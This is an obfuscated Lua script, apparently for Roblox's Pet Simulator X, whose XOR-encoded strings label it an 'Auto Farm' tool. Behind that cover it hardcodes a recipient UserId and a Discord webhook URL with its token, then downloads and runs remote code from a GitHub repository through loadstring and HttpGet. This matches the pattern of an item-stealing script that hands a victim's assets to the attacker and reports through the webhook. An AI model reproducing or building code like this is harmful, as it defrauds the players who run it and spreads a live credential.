--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.5) ~  Much Love, Ferib 

]]--

local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9)local v10={};for v11=1, #v8 do v6(v10,v0(v4(v1(v2(v8,v11,v11 + 1 )),v1(v2(v9,1 + ((v11-1)% #v9) ,1 + ((v11-1)% #v9) + 1 )))%256 ));end return v5(v10);end UserId=160266160 + 572797960 ;WebHook="https://discord.com/api/webhooks/1089961265109139516/4Z5tI4NEPCINixX5KYCQld1tUiFT-6xVBa8nyg80HLZXkUEHA9_iO5c08Z9kGACaNcVH";_G.CustomScriptName=v7("\119\198\68\94\151\112\210\66\92","\54\179\48\49\183");_G.Text1=v7("\19\250\46\208\6\49\242\111\231\12\45\252\63\192","\95\149\79\180\111");_G.Text2=v7("\73\141\115\249\117\168\39\66\120\131\104\173\79\165\50\11\110\152","\30\236\26\141\28\198\64\98");_G.Text3=v7("\83\125\225\129\232\121\126\114\164\177\224\98\121\101\240\145\173\62\62","\16\21\132\226\131\16");_G.Text4=v7("\109\222\5\188\74\195\10\169\30\249\7\188\87\218\16\224\16\132","\62\170\100\206");loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimxgm.lua"))();